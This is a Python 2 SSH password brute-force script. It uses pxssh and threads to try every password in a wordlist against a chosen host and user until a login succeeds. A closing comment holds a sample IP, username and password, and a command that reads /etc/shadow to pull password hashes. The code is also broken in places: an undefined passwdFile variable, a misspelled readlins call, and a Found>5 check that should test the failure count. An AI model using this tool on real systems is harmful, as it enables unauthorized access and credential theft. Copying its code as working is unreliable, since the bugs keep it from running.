# -*- coding: utf-8 -*-
import pxssh
import optparse
import time
from threading import *
maxConnection = 5
connection_lock = BoundedSemaphore(value = maxConnection)
Found = False
Fails = 0

def connect(host,user,password,release):
    global Fails
    global Found
    try :
        s = pxssh.pxssh()
        s.login(host,user,password)
        print '[+] Password Found: ' + password
        Found = True
    except Exception,e:
        if 'read_nonblocking' in str(e):
            Fails +=1
            time.sleep(5)
            connect(host,user,password,False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host,user,password,False)
    finally:
        if release:
            connection_lock.release()

def main():
    
    parser = optparse.OptionParser('usage %prog -H'+\
        '<target host> -u <user> -F <password list>')
    parser.add_option('-H',dest='tgtHost',type='string',\
        help='specify target host')
    parser.add_option('-F',dest='passwdFile', type='string',\
        help='specify password file')
    parser.add_option('-u',dest='user',type='string',\
        help='specify the user')
    (options,args) = parser.parse_args()
    host = options.tgtHost
    user = options.user
    if host == None or passwdFile == None:
        print parser.usage
        exit(0)
    user = options.user
    fn = open(passwdFile,'r')
    user = options.user
    for line in fn.readlins():
        user = options.user
        if Found:
            print "[*] Existing: Password Found"
            exit(0)
        if Found>5:
            print "[!] Existing: Too many Socket TimeOuts"
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print "[-] Testing： "+str(password)
        t = Thread(target=connect, args=(host,user,password,True))
        child = t.start()

if __name__ == '__main__':
    main()
        
    




        
#s = connect('192.168.1.100','xuegeng','francium0426')
#send_command(s,'cat /etc/shadow | grep xuegeng')